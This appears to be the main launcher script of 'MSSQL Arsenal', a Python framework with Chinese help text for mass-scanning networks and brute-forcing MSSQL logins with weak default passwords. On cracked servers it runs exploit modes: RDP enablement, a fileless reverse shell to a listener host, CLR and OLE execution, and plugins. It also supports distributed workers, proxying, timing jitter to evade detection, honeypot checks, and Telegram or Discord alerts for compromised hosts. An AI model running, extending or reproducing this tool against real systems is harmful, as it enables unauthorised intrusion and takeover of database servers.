#!/usr/bin/env python3
import sys
import os
import argparse
import asyncio
import signal
from typing import Optional, List

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.config import ScanConfig, ExploitMode, AlertConfig, AlertPlatform
from core.logger import setup_logging, logger
from core.signals import request_shutdown, clear_shutdown, is_shutdown_requested, wait_all
from core.database import db
from core.utils import IPUtils
from core.proxy import setup_proxy
from scanner.port_scanner import AsyncPortScanner
from bruter.bruter import MSSQLBruter
from exploiter import RDPExploiter, FilelessExploiter, CLRExploiter, OLEExploiter, PluginManager
from distributed.master import DistributedMaster
from distributed.worker import DistributedWorker
from report.generator import ReportGenerator

try:
    from PyQt6.QtWidgets import QApplication
    from gui.main_window import MainWindow
    GUI_AVAILABLE = True
except ImportError:
    GUI_AVAILABLE = False

def parse_args():
    parser = argparse.ArgumentParser(description='MSSQL Arsenal - 终极MSSQL扫描利用框架',
                                     formatter_class=argparse.RawDescriptionHelpFormatter,
                                     epilog='''
使用示例:
  %(prog)s -t 192.168.1.0/24
  %(prog)s -t 10.0.0.1-10.0.0.254 --exploit rdp
  %(prog)s -t file://targets.txt --users users.txt --passwords pass.txt
  %(prog)s --master
  %(prog)s --worker 192.168.1.100
  %(prog)s --gui
        ''')
    parser.add_argument('-t', '--target', help='目标 (CIDR/IP范围/file://路径/域名)')
    parser.add_argument('-p', '--port', type=str, default='1433', help='端口，多个用逗号分隔 (默认1433)')
    parser.add_argument('--users', help='用户名字典文件')
    parser.add_argument('--passwords', help='密码字典文件')
    parser.add_argument('--concurrency', type=int, default=500, help='扫描并发数 (默认500)')
    parser.add_argument('--timeout', type=float, default=3.0, help='连接超时(秒) (默认3.0)')
    parser.add_argument('--rate-limit', type=int, default=0, help='爆破限速(次/秒) (0=不限)')
    parser.add_argument('--retries', type=int, default=2, help='登录重试次数 (默认2)')
    parser.add_argument('--strategy', choices=['ip_first', 'cred_first'], default='ip_first', help='爆破策略')
    parser.add_argument('--shuffle', action='store_true', help='随机凭证顺序')
    parser.add_argument('--random-delay', action='store_true', help='启用随机延迟抖动')
    parser.add_argument('--delay-jitter', type=float, default=0.2, help='延迟抖动幅度 (默认0.2秒)')
    parser.add_argument('--tls', action='store_true', help='使用TLS加密连接')
    parser.add_argument('--windows-auth', action='store_true', help='使用Windows集成认证')
    parser.add_argument('--kerberos', action='store_true', help='使用Kerberos认证（需先kinit）')
    parser.add_argument('--domain', default='', help='Windows认证域名')
    parser.add_argument('--proxy', help='SOCKS5代理，如 socks5://127.0.0.1:1080')
    parser.add_argument('--exploit', choices=['rdp', 'fileless', 'clr', 'ole', 'plugin', 'none'], default='none', help='利用模式')
    parser.add_argument('--plugin', help='插件名称')
    parser.add_argument('--lhost', help='反向连接IP (fileless模式)')
    parser.add_argument('--lport', type=int, default=4444, help='反向连接端口')
    parser.add_argument('--no-honeypot', action='store_true', help='禁用蜜罐检测')
    parser.add_argument('--no-cve', action='store_true', help='禁用CVE检测')
    parser.add_argument('--honeypot-threshold', type=float, default=0.6, help='蜜罐阈值')
    parser.add_argument('--report', choices=['json', 'html'], help='生成报告格式')
    parser.add_argument('-o', '--output', help='报告输出文件')
    parser.add_argument('--hide-passwords', action='store_true', help='报告中隐藏密码')
    parser.add_argument('--master', action='store_true', help='启动分布式主节点')
    parser.add_argument('--worker', metavar='MASTER_IP[:PORT]', help='启动分布式工作节点')
    parser.add_argument('--master-port', type=int, default=9999, help='主节点端口')
    parser.add_argument('--gui', action='store_true', help='启动图形界面')
    parser.add_argument('--alert-telegram', help='Telegram告警 (格式: TOKEN:CHATID)')
    parser.add_argument('--alert-discord', help='Discord告警 (Webhook URL)')
    parser.add_argument('--version', action='version', version='MSSQL Arsenal 1.0.0')
    return parser.parse_args()

def build_config(args) -> ScanConfig:
    config = ScanConfig()
    if args.target:
        config.targets = IPUtils.parse_target(args.target)
    config.ports = [int(p.strip()) for p in args.port.split(',') if p.strip()]
    config.max_concurrency = args.concurrency
    config.timeout = args.timeout
    config.rate_limit = args.rate_limit
    config.max_retries = args.retries
    config.credential_strategy = args.strategy
    config.shuffle_creds = args.shuffle
    config.random_delay = args.random_delay
    config.delay_jitter = args.delay_jitter
    config.use_tls = args.tls
    config.use_windows_auth = args.windows_auth
    config.use_kerberos = args.kerberos
    config.domain = args.domain
    config.proxy = args.proxy
    mode_map = {'rdp': ExploitMode.RDP, 'fileless': ExploitMode.FILELESS, 'clr': ExploitMode.CLR, 'ole': ExploitMode.OLE, 'plugin': ExploitMode.PLUGIN, 'none': ExploitMode.NONE}
    config.exploit_mode = mode_map.get(args.exploit, ExploitMode.NONE)
    if args.exploit == 'fileless':
        if not args.lhost: raise ValueError("fileless模式必须指定 --lhost")
        config.exploit_config = {'lhost': args.lhost, 'lport': args.lport}
    elif args.exploit == 'plugin':
        if not args.plugin: raise ValueError("plugin模式必须指定 --plugin")
        config.exploit_config = {'plugin_name': args.plugin}
    config.enable_honeypot = not args.no_honeypot
    config.enable_cve_check = not args.no_cve
    config.honeypot_threshold = args.honeypot_threshold
    config.hide_passwords = args.hide_passwords
    if args.users:
        with open(args.users, 'r', encoding='utf-8') as f:
            config.users = [l.strip() for l in f if l.strip()]
    if args.passwords:
        with open(args.passwords, 'r', encoding='utf-8') as f:
            config.passwords = [l.strip() for l in f if l.strip()]
    if args.alert_telegram:
        parts = args.alert_telegram.split(':')
        if len(parts) == 2:
            config.alert = AlertConfig(enabled=True, platform=AlertPlatform.TELEGRAM, bot_token=parts[0], chat_id=parts[1])
    elif args.alert_discord:
        config.alert = AlertConfig(enabled=True, platform=AlertPlatform.DISCORD, webhook_url=args.alert_discord)
    return config

async def run_scan(config: ScanConfig):
    logger.info(f"目标数量: {len(config.targets)}, 端口: {config.ports}")
    scanner = AsyncPortScanner(concurrency=config.max_concurrency, timeout=config.timeout)
    open_results = await scanner.scan(config.targets, config.ports)
    open_ips = list(set(r.ip for r in open_results))
    logger.info(f"发现 {len(open_ips)} 个开放端口")
    if not open_ips: return
    bruter = MSSQLBruter(strategy=config.credential_strategy, timeout=config.timeout, retries=config.max_retries, rate_limit=config.rate_limit, use_tls=config.use_tls, use_windows_auth=config.use_windows_auth, use_kerberos=config.use_kerberos, domain=config.domain, random_delay=config.random_delay, delay_jitter=config.delay_jitter)
    users = config.users or ['sa', 'admin', 'sql']
    passwords = config.passwords or ['', 'sa', '123456', 'password', 'admin123']
    cracked = bruter.brute(open_ips, config.ports, users, passwords)
    if not cracked:
        logger.info("未发现弱口令")
        return
    logger.info(f"爆破成功 {len(cracked)} 个目标")
    if config.exploit_mode != ExploitMode.NONE:
        exploiter = None
        if config.exploit_mode == ExploitMode.RDP:
            exploiter = RDPExploiter()
        elif config.exploit_mode == ExploitMode.FILELESS:
            exploiter = FilelessExploiter()
        elif config.exploit_mode == ExploitMode.CLR:
            exploiter = CLRExploiter()
        elif config.exploit_mode == ExploitMode.OLE:
            exploiter = OLEExploiter()
        elif config.exploit_mode == ExploitMode.PLUGIN:
            pm = PluginManager()
            plugin_name = config.exploit_config.get('plugin_name')
            if plugin_name:
                for cred in cracked:
                    if is_shutdown_requested(): break
                    res = pm.run_plugin(plugin_name, cred.ip, cred.port, cred.username, cred.password)
                    logger.info(f"{cred.ip} 插件结果: {res}")
            return
        if exploiter:
            for cred in cracked:
                if is_shutdown_requested(): break
                res = exploiter.exploit(cred.ip, cred.port, cred.username, cred.password, **config.exploit_config)
                logger.info(f"{cred.ip} 利用结果: {res}")
            exploiter.close()
    if args.report:
        output_file = args.output or f"scan_report.{args.report}"
        if args.report == 'json':
            ReportGenerator.generate_json(output_file, config.hide_passwords)
        else:
            ReportGenerator.generate_html(output_file, config.hide_passwords)

def main():
    global args
    args = parse_args()

    # 设置代理（如果指定）
    if args.proxy:
        setup_proxy(args.proxy)
        logger.info(f"已启用 SOCKS5 代理: {args.proxy}")

    if args.gui:
        if not GUI_AVAILABLE:
            print("错误: PyQt6 未安装，请运行: pip install PyQt6")
            sys.exit(1)
        setup_logging(hide_secrets=args.hide_passwords)
        app = QApplication(sys.argv)

        # ── Font fallback: set a CJK-capable font as the default.
        #    Qt offscreen platform may have empty QFontDatabase (zero families)
        #    which causes STATUS_STACK_BUFFER_OVERRUN when painting CJK text.
        #    We guard against this by only touching fonts if Qt is NOT offscreen.
        #    On real Windows desktop (with display) Qt's default font discovery
        #    already finds the right CJK fonts — this block is a safety net.
        if os.environ.get("QT_QPA_PLATFORM") != "offscreen":
            try:
                from PyQt6.QtGui import QFontDatabase, QFont
                _fams = QFontDatabase.families()
                _pfx = ("Malgun Gothic" if "Malgun Gothic" in _fams else
                        ("Microsoft YaHei" if "Microsoft YaHei" in _fams else
                         (_fams[0] if _fams else "Arial")))
                _dflt = QFont(_pfx, 9)
                _dflt.setStyleHint(QFont.StyleHint.SansSerif)
                _dflt.setFamilies([_pfx, "Arial", "Segoe UI"])
                app.setFont(_dflt)
            except Exception:
                pass

        window = MainWindow()
        window.show()
        sys.exit(app.exec())
    if args.master:
        setup_logging()
        master = DistributedMaster(host='0.0.0.0', port=args.master_port)
        def sig_handler(sig, frame):
            logger.info("收到中断信号，停止主节点...")
            master.stop()
            sys.exit(0)
        signal.signal(signal.SIGINT, sig_handler)
        master.start()
        return
    if args.worker:
        setup_logging()
        parts = args.worker.split(':')
        host = parts[0]
        port = int(parts[1]) if len(parts) > 1 else 9999
        users = passwords = None
        if args.users:
            with open(args.users, encoding='utf-8') as f: users = [l.strip() for l in f if l.strip()]
        if args.passwords:
            with open(args.passwords, encoding='utf-8') as f: passwords = [l.strip() for l in f if l.strip()]
        worker = DistributedWorker(host, port, users, passwords)
        def sig_handler(sig, frame):
            logger.info("收到中断信号，停止工作节点...")
            worker.stop()
            sys.exit(0)
        signal.signal(signal.SIGINT, sig_handler)
        worker.start()
        return
    if not args.target:
        print("错误: 必须指定目标 (-t) 或使用 --gui/--master/--worker")
        sys.exit(1)
    setup_logging(hide_secrets=args.hide_passwords)
    try:
        config = build_config(args)
        config.validate()
    except ValueError as e:
        logger.error(f"配置错误: {e}")
        sys.exit(1)
    def sig_handler(sig, frame):
        logger.info("收到中断信号，正在停止...")
        request_shutdown()
    signal.signal(signal.SIGINT, sig_handler)
    try:
        asyncio.run(run_scan(config))
    except KeyboardInterrupt:
        logger.info("扫描已中断")
    finally:
        wait_all(timeout=5.0)
        db.shutdown()
        logger.info("程序退出")

if __name__ == '__main__':
    main()